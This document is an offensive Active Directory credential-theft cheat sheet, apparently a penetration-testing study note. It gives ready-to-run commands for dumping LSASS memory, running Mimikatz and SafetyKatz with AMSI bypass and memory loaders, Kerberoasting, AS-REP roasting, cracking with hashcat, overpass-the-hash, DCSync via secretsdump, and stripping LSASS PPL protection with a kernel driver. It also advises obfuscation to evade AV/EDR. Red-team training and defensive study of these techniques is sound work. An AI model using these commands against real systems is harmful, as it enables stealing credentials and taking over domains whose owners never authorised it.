# 05 — Credential Access + LSASS + DCSync

> [!IMPORTANT]
> Gaining local administrative privileges on a machine allows extraction of credential material from the LSASS process memory, SAM registry hive, LSA secrets, or remotely via DCSync replication.

---

## LSASS & Credential Architecture

The **Local Security Authority Subsystem Service (LSASS)** (`lsass.exe`) manages local security policies and authenticates users.

LSASS holds active credential material in memory:
- Plaintext passwords (WDigest, SSP)
- NTLM hashes (`sekurlsa::msv`)
- Kerberos tickets & TGT session keys (`sekurlsa::tickets` / `sekurlsa::ekeys`)
- DPAPI Master Keys (`sekurlsa::dpapi`)

---

## LSASS Dumping Methods

> [!WARNING]
> Dumping LSASS via direct API calls or `procdump.exe` is heavily monitored by AV/EDR. Use obfuscated loaders or indirect memory dumping where required.

### Task Manager (GUI)
- Open Task Manager → Details tab → Right-click `lsass.exe` → **Create dump file**.
- Output saved to `C:\Users\<USER>\AppData\Local\Temp\lsass.dmp`.

### ProcDump (Sysinternals)
```cmd
procdump.exe -accepteula -ma lsass.exe C:\AD\Tools\lsass.dmp
```

### Parse Dump File Offline
```text
mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Mimikatz & SafetyKatz Memory Extraction

```cmd
# Direct Mimikatz execution
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# SafetyKatz execution (Obfuscated Mimikatz wrapper with AMSI bypass)
SafetyKatz.exe "sekurlsa::ekeys" "exit"

# Executing SafetyKatz via memory loader
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
```

---

## Kerberoasting

Request TGS tickets for accounts with SPNs, then crack them offline.

### Enumerate Kerberoastable Accounts
```powershell
# PowerView
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Rubeus
```cmd
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:<USER> /outfile:hashes.txt
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

### Impacket — GetUserSPNs
```bash
# Enumerate SPNs
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>

# Request TGS and dump crackable hashes
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

### Crack with Hashcat
```bash
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

## AS-REP Roasting

Target accounts with Kerberos pre-authentication disabled — no password needed to request an AS-REP.

### Enumerate AS-REP Roastable Accounts
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### Rubeus
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:<USER> /format:hashcat /outfile:asrep.txt
```

### Impacket — GetNPUsers
```bash
# With credentials
impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile asrep.txt

# Without credentials (supply username list)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
```

### Crack with Hashcat
```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## Overpass-the-Hash (OPTH)

Requests a valid Kerberos TGT using an NTLM hash or AES key instead of a plaintext password.

### Mimikatz
```text
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe
```

### Rubeus
```cmd
# Standard TGT request & injection
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /ptt

# Opsec / Elevated NetOnly Process Spawn
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Impacket — psexec / wmiexec with hash
```bash
impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
```

---

## DCSync Credential Replication

Uses Active Directory's Directory Replication Service (`MS-DRSR` / DRSUAPI) to request account secrets directly from a DC.

> [!IMPORTANT]
> **Prerequisites:** The account must hold:
> - `DS-Replication-Get-Changes`
> - `DS-Replication-Get-Changes-All`

### Mimikatz
```text
lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt
lsadump::dcsync /user:<DOMAIN_SHORT>\Administrator
```

### Impacket — secretsdump
```bash
# With password
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# With NTLM hash
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>

# Dump only specific user
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt
```

---

## LSASS Protected Process Light (PPL) Bypass

If LSASS is protected by LSA Protection (PPL), user-mode dumps will fail with `ACCESS DENIED`.

```text
mimikatz # privilege::debug
mimikatz # !drv::install C:\AD\Tools\mimidrv.sys
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```
